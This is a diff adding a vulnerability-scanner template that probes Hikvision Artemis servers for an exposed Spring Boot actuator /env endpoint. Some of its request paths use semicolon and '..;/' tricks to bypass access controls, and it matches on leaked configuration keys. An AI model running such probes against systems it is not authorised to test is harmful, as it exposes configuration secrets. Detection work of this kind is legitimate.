@@ -1,0 +1,48 @@
+id: Hikvision-env-infoleak
+
+info:
+  name: Hikvision Springboot Env Actuator - Detect
+  author: Hikvision
+  severity: high
+  tags: Hikvision
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/artemis/env"
+      - "{{BaseURL}}/artemis-portal/artemis/env"
+      - "{{BaseURL}}/artemis/actuator/env"
+      - "{{BaseURL}}/artemis;/env;"
+      - "{{BaseURL}}/artemis/1/..;/env"
+
+    stop-at-first-match: true
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "applicationConfig"
+          - "activeProfiles"
+        condition: or
+
+      - type: word
+        part: body
+        words:
+          - "server.port"
+          - "local.server.port"
+        condition: or
+
+      - type: word
+        part: header
+        words:
+          - "application/json"
+          - "application/vnd.spring-boot.actuator"
+          - "application/vnd.spring-boot.actuator.v1+json"
+          - "application/vnd.spring-boot.actuator.v2+json"
+          - "application/vnd.spring-boot.actuator.v3+json"
+        condition: or
+
+      - type: status
+        status:
+          - 200
